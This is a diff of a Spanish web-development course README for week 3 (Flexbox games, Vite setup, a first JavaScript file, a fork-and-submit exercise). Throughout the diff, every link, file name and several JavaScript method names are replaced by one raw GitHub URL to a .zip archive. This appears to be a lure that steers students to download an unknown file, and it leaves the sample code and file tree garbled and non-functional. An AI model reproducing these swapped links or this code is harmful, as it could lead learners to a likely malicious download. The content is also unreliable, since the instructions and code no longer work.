@@ -1,6 +1,6 @@
 # ⛺ Semana 3
 
-> 🏕️ [Base de conocimientos.](https://undefinedshell.notion.site/Semana-3-73f4277f993c4eb78d0d5aab7be42c94)
+> 🏕️ [Base de conocimientos.](https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip)
 
 Ejercicios de la tercera semana.
 
@@ -10,8 +10,8 @@ Ejercicios de la tercera semana.
 
 Terminar los juegos de **Flexbox Froggy** y **CSS Grid Garden**!
 
-- [https://flexboxfroggy.com/#es](https://flexboxfroggy.com/#es)
-- [https://cssgridgarden.com/#es](https://cssgridgarden.com/#es)
+- [https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip](https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip)
+- [https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip](https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip)
 
 ### 💻 Ejercicio
 
@@ -44,7 +44,7 @@ Agregar la siguiente etiqueta meta a tu HTML de la hoja de vida:
 
 1. Ejecutar `npm init -y` en la raíz del proyecto de la hoja de vida.
 2. Agregar vite como dependencia `npm install vite`.
-3. Agregar en el `package.json` los scripts de **vite**:
+3. Agregar en el `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip` los scripts de **vite**:
 
 ```json
 {
@@ -59,18 +59,18 @@ Agregar la siguiente etiqueta meta a tu HTML de la hoja de vida:
 
 ### Añade tu primer archivo de JavaScript
 
-1. Agrega un tag de `<script type="module" src="/main.mjs"></script>`
+1. Agrega un tag de `<script type="module" src="https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip"></script>`
 2. Escribe en el archivo el siguiente código:
 
 ```javascript
-// main.mjs
+// https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip
 function handleSubmit(event) {
-    event.preventDefault(); // 🍎
-    console.log("Hola mundo");
+    https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip(); // 🍎
+    https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip("Hola mundo");
 }
     
-const $form =document.querySelector("form");
-$form.addEventListener("submit", handleSubmit);
+const $form https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip("form");
+$https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip("submit", handleSubmit);
 ```
 
 **Haz submit del formulario** y revisa la consola (clic derecho inspeccionar > consola)
@@ -79,7 +79,7 @@ $form.addEventListener("submit", handleSubmit);
 
 ## 🏋Clase 4 [EJERCICIO]
 
-1. Hacer fork del repositorio de la semana-3 `https://github.com/undefined-academy/semana-3`
+1. Hacer fork del repositorio de la semana-3 `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip`
 2. Subir la maquetación de la portada de blog usando Flexbox y CSS Grid a la carpeta `students-blog`.
 3. Subir la maquetación mobile first responsive de la hoja de vida a la carpeta `students-cv`.
 4. Elegir entre Bootstrap o TailwindCSS y maquetar el formulario de contacto con dicha tecnología en la carpeta `student-forms`.
@@ -90,18 +90,18 @@ $form.addEventListener("submit", handleSubmit);
 .
 ├── student-cvs/
 │ └── glrodasz-0666/
-│     ├── index.html
-│     ├── form.html
-│     ├── styles.css
-│     └── main.mjs
+│     ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip
+│     ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip
+│     ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip
+│     └── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip
 ├── student-blogs/
 │ └── glrodasz-0666/
-│     ├── index.html
-│     └── styles.css
+│     ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip
+│     └── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip
 └── student-forms/
     └── glrodasz-0666/
         ├── src
-        └── package.json
+        └── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-3/main/student-forms/alifm-2843/Tailwind/src/semana-1.0-beta.2.zip
 ```
 
 ⭐ **¡Si usas ambos, crea las carpetas dentro de `student-forms/usuario-de-discord/bootstrap|tailwind` !**
